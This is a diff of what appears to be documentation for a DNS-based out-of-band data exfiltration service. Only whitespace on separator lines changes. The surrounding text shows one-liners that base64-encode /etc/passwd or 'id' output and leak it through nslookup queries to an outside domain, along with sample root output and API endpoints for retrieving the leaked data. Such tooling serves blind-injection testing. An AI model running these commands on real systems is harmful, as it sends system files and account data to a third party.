@@ -17,7 +17,7 @@ Address:	108.61.10.10#53
 Non-authoritative answer:
 Name:	dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.xdebug.info
 Address: 127.0.0.1
-##############################################################################################
+##############################################################################################  
 
 Access following API:
 http://127.0.0.1/_query
@@ -42,14 +42,14 @@ xdebug.info. 45.32.103.184 2018-11-19 16:36:28
 
 nslookup check.7b0f687d4d6d.xdebug.info
 
-######################################################
+######################################################  
 root@vultr:~# nslookup check.7b0f687d4d6d.xdebug.info
 Server:		108.61.10.10
 Address:	108.61.10.10#53
 
 Non-authoritative answer:
 Name:	check.7b0f687d4d6d.xdebug.info
-######################################################
+######################################################  
 
 Request API:
 http://localhost/_check?type=dns&uuid=7b0f687d4d6d
@@ -61,7 +61,7 @@ Response JSON:
 
 cat /etc/passwd |base64 -w60|cat -n|awk '{print $2"."$1".8b0f687d4d6d.xdebug.info"};'|xargs -n 1 nslookup
 
-##########################################################################################################
+##############################################################################################  
 root@vultr:~# id |base64 -w60|cat -n|awk '{print $2"."$1".9b0f687d4d6d.xdebug.info"};'|xargs -n 1 nslookup
 Server:		108.61.10.10
 Address:	108.61.10.10#53
@@ -70,7 +70,7 @@ Non-authoritative answer:
 Name:	dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK.1.9b0f687d4d6d.xdebug.info
 Address: 127.0.0.1
 
-##########################################################################################################
+##############################################################################################  
 
 Request API:
 http://localhost/_echo?type=dns&uuid=9b0f687d4d6d
